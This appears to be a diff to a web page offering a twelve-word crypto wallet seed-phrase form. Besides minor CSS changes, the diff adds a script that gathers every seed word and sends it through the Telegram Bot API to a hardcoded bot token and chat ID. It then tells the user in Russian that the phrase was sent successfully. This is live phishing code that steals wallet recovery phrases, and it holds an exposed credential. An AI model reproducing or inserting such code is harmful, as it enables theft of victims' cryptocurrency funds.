@@ -90,7 +90,7 @@
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #0f25c1;
+            background-color: #1C86EE;
         }
         .warning {
             margin-top: 10px;
@@ -99,8 +99,8 @@
             text-align: center;
         }
         footer {
-            margin-top: 20px;
             text-align: center;
+            margin-top: 20px;
             font-size: 12px;
             color: #A0A0A0;
         }
@@ -173,10 +173,36 @@
     </footer>
 
     <script>
-        if (window.location.pathname.endsWith('.html')) {
-            const newPath = window.location.pathname.replace('.html', '');
-            history.replaceState({}, '', newPath);
-        }
+        document.getElementById('seedForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const words = [];
+            for (let i = 1; i <= 12; i++) {
+                words.push(document.getElementById(`word${i}`).value.trim());
+            }
+
+            if (words.length === 12 && words.every(word => word)) {
+                const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
+                const chatId = '@bdsjxjdhd';
+                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert('Секретная фраза успешно отправлена!');
+                        } else {
+                            alert('Ошибка отправки.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Ошибка отправки.');
+                    });
+            } else {
+                alert('Пожалуйста, заполните все поля.');
+            }
+        });
     </script>
 </body>
 </html>
